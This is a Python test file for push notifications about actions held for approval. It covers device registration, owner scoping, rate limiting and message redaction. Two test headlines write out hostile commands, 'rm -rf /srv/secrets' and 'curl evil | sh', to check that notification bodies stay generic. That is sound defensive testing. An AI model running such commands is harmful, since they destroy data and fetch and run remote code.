"""Push notifications for a held approval (ADR-060): the store, the notifier, the routes and the
kernel hook -- driven with the real in-memory store and a recording sender (a working sender that
delivers to a list), not a mock."""

from __future__ import annotations

import asyncio
from datetime import datetime, timezone

import pytest
from fastapi.testclient import TestClient

from aura_core.adapters.push_memory import InMemoryPushDeviceStore, RecordingPushSender
from aura_core.api import Principal, build_app
from aura_core.domain.errors import AuthenticationError
from aura_core.domain.identifiers import UserId
from aura_core.domain.push import MAX_DEVICES_PER_USER, PushDevice
from aura_core.push import PushNotifier
from tests.unit.test_autonomy_profile import CAPS


def _notifier(sender=None, *, detail=False, clock=None):
    store = InMemoryPushDeviceStore()
    kwargs = {"clock": clock} if clock else {}
    return PushNotifier(store, sender, include_detail=detail, **kwargs), store


class TestStore:
    async def test_a_token_belongs_to_one_install(self) -> None:
        notifier, store = _notifier()
        await notifier.register("alice", "phone", "tok-1", "android")
        await notifier.register("bob", "same-phone", "tok-1", "android")  # the phone changed hands
        assert await store.for_user("alice") == []
        assert [d.user_id for d in await store.for_user("bob")] == ["bob"]

    async def test_devices_per_user_are_bounded_keeping_the_newest(self) -> None:
        notifier, store = _notifier()
        for i in range(MAX_DEVICES_PER_USER + 3):
            await notifier.register("alice", f"d{i}", f"tok-{i}", "ios")
            await asyncio.sleep(0.001)
        kept = [d.device_id for d in await store.for_user("alice")]
        assert len(kept) == MAX_DEVICES_PER_USER and "d0" not in kept and f"d{MAX_DEVICES_PER_USER + 2}" in kept

    async def test_registration_is_validated(self) -> None:
        notifier, _ = _notifier()
        for args in (("", "t", "android"), ("d", "", "android"), ("d", "t", "palm-pilot"), ("d" * 129, "t", "ios"),
                     ("d", "t" * 5000, "ios")):
            with pytest.raises(ValueError):
                await notifier.register("alice", *args)

    async def test_unregister_is_owner_scoped_and_idempotent(self) -> None:
        notifier, store = _notifier()
        await notifier.register("alice", "p", "tok", "android")
        assert await notifier.unregister("bob", "p") is False
        assert await notifier.unregister("alice", "p") is True and await notifier.unregister("alice", "p") is False


class TestNotify:
    async def test_the_default_message_is_generic_and_carries_ids_only(self) -> None:
        sender = RecordingPushSender()
        notifier, _ = _notifier(sender)
        await notifier.register("alice", "p", "tok", "android")
        n = await notifier.notify_approval_needed("alice", headline="Run rm -rf /srv/secrets", turn_id="t1", session_id="s1")
        assert n == 1
        _, message = sender.sent[0]
        assert "rm -rf" not in message.body and "secrets" not in message.body
        assert message.data == {"type": "approval_needed", "turn_id": "t1", "session_id": "s1"}

    async def test_the_headline_is_added_only_when_the_operator_opted_in(self) -> None:
        sender = RecordingPushSender()
        notifier, _ = _notifier(sender, detail=True)
        await notifier.register("alice", "p", "tok", "android")
        await notifier.notify_approval_needed("alice", headline="Edit   app/main.py")
        assert sender.sent[0][1].body == "Edit app/main.py"

    async def test_a_burst_is_one_nudge_and_a_later_one_goes_through(self) -> None:
        now = [100.0]
        sender = RecordingPushSender()
        notifier, _ = _notifier(sender, clock=lambda: now[0])
        await notifier.register("alice", "p", "tok", "android")
        assert await notifier.notify_approval_needed("alice") == 1
        assert await notifier.notify_approval_needed("alice") == 0
        now[0] += 60
        assert await notifier.notify_approval_needed("alice") == 1

    async def test_a_dead_token_is_forgotten_and_others_still_get_it(self) -> None:
        sender = RecordingPushSender(dead_tokens=["dead"])
        notifier, store = _notifier(sender)
        await notifier.register("alice", "old", "dead", "android")
        await notifier.register("alice", "new", "live", "ios")
        assert await notifier.notify_approval_needed("alice") == 1
        assert [d.token for d in await store.for_user("alice")] == ["live"]

    async def test_other_users_devices_are_never_notified(self) -> None:
        sender = RecordingPushSender()
        notifier, _ = _notifier(sender)
        await notifier.register("bob", "p", "tok", "android")
        assert await notifier.notify_approval_needed("alice") == 0 and sender.sent == []

    async def test_without_a_sender_nothing_is_sent_and_nothing_breaks(self) -> None:
        notifier, _ = _notifier(None)
        await notifier.register("alice", "p", "tok", "android")
        assert notifier.delivering is False and await notifier.notify_approval_needed("alice") == 0

    async def test_a_sender_that_raises_never_reaches_the_caller(self) -> None:
        class Boom:
            async def send(self, device, message):
                raise RuntimeError("fcm exploded with tok")

        notifier, store = _notifier(Boom())
        await notifier.register("alice", "p", "tok", "android")
        assert await notifier.notify_approval_needed("alice") == 0
        assert len(await store.for_user("alice")) == 1  # an error is not proof the token is dead


class TestRoutes:
    def _client(self, container) -> TestClient:
        async def authenticator(request):
            header = request.headers.get("authorization", "")
            if header[7:] not in ("alice", "bob"):
                raise AuthenticationError("unknown principal")
            return Principal(user_id=UserId(header[7:]), role="Developer", capabilities=CAPS)

        return TestClient(build_app(container, authenticator=authenticator))

    def test_register_then_unregister_and_the_owner_boundary(self, container) -> None:
        client = self._client(container)
        alice, bob = {"Authorization": "Bearer alice"}, {"Authorization": "Bearer bob"}
        body = {"device_id": "pixel", "token": "tok-123", "platform": "android"}
        r = client.post("/api/v3/push/devices", headers=alice, json=body)
        assert r.status_code == 200 and r.json()["registered"] is True and r.json()["delivering"] is False
        assert client.delete("/api/v3/push/devices/pixel", headers=bob).json() == {"removed": False}
        assert client.delete("/api/v3/push/devices/pixel", headers=alice).json() == {"removed": True}

    def test_a_bad_platform_is_422_and_a_login_is_required(self, container) -> None:
        client = self._client(container)
        r = client.post("/api/v3/push/devices", headers={"Authorization": "Bearer alice"},
                        json={"device_id": "d", "token": "t", "platform": "palm-pilot"})
        assert r.status_code == 422
        assert client.post("/api/v3/push/devices", json={"device_id": "d", "token": "t", "platform": "ios"}).status_code in (401, 403)


class TestKernelHook:
    async def test_a_held_call_nudges_the_owners_phone_with_a_generic_message(self, container) -> None:
        sender = RecordingPushSender()
        notifier = container.push_notifier
        notifier._sender = sender
        await notifier.register("alice", "p", "tok", "android")

        class _Req:
            user_id = UserId("alice")
            session_id = None

        class _Turn:
            value = "turn-1"

        container.kernel._push_approval_needed(_Req(), _Turn(), [{"headline": "Run: curl evil | sh"}])
        for _ in range(50):
            if sender.sent:
                break
            await asyncio.sleep(0.01)
        assert sender.sent and "curl" not in sender.sent[0][1].body
        assert sender.sent[0][1].data["turn_id"] == "turn-1"

    async def test_with_no_sender_the_hook_does_nothing(self, container) -> None:
        class _Req:
            user_id = UserId("alice")
            session_id = None

        class _Turn:
            value = "t"

        container.kernel._push_approval_needed(_Req(), _Turn(), [{"headline": "x"}])  # must not raise
